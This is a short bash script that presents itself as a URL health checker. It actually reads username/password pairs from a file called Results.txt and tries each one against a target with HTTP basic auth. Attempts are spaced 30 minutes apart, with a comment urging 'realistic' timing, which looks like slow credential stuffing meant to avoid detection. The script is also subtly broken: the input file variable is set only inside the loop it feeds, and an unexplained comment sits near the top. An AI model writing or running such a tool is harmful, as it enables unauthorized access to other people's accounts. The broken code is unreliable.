#!/usr/bin/env bash
set -euo pipefail

URL="${1:-}" # Falling Angel
[[ -n "$URL" ]] || { echo "Usage: $0 https://example.com/health"; exit 1; }

LOG="${LOG:-$HOME/curl_5x_daily.log}"

curl_once() {
  local USER="$1"
    local PASS="$2"
  local ts code total
  ts="$(date -Is)"
  code="$(curl -sS -o /dev/null \
    -u "$USER:$PASS" \
    --connect-timeout 10 --max-time 30 --retry 2 --retry-delay 2 \
    -w "%{http_code}" \
    "$URL" || echo "000")"

  echo "$ts url=$URL http_code=$code" >> "$LOG"
}

while IFS= read -r line; do
     FILE="Results.txt"
    [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue

    PASS="${line##* }"
    USER="${line% *}"
    for i in {1..5}; do
      curl_once "$USER" "$PASS"
      [[ "$i" -lt 5 ]] && sleep 1800   # every 30 minutes maybe every day or two be realistic!
    done
done < "$FILE"